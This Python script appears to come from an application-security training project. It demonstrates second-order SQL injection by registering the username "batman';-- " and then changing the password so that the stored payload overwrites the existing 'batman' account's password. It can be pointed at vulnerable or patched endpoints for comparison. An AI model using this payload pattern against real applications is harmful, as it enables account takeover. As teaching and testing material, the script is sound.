import json
from urllib.error import URLError
from urllib.request import Request, _UrlopenRet, urlopen

import cli

type urllib_cookie = _UrlopenRet

use_vulnerable_endpoint, use_webapp_url = cli.get_cli_arguments()

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:12301"

if use_vulnerable_endpoint:
    urls = [
        f"{url_prefix}/vulnerabilities/sqli2/register/",
        f"{url_prefix}/vulnerabilities/sqli2/change_password/",
    ]
else:
    urls = [
        f"{url_prefix}/patches/sqli2/register/",
        f"{url_prefix}/patches/sqli2/change_password/",
    ]


def register(
    username_to_exploit: str, password: str
) -> dict[urllib_cookie, urllib_cookie]:
    username = f"{username_to_exploit}';-- "
    data = {"username": username, "password": password}

    try:
        req = Request(
            urls[0],
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json"},
        )

        with urlopen(req) as response:
            cookies = dict(
                [
                    cookie.split("=", 1)
                    for cookie in response.headers.get("Set-Cookie", "").split("; ")[
                        0:1
                    ]
                ]
            )
            print(f"Response: {response.read().decode('utf-8')}")
            return cookies
    except URLError as e:
        print(f"Error: {e}")
        return {}


def change_password(cookies: dict[urllib_cookie, urllib_cookie], password: str) -> None:
    data = {"old": password, "new": password, "new_verify": password}

    try:
        cookie_string = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        req = Request(
            urls[1],
            data=json.dumps(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/json", "Cookie": cookie_string},
        )

        with urlopen(req) as response:
            print(f"Response: {response.read().decode('utf-8')}")
    except URLError as e:
        print(f"Error: {e}")


password = "gotham"
username_to_exploit = "batman"
cookies = register(username_to_exploit, password)
change_password(cookies, password)
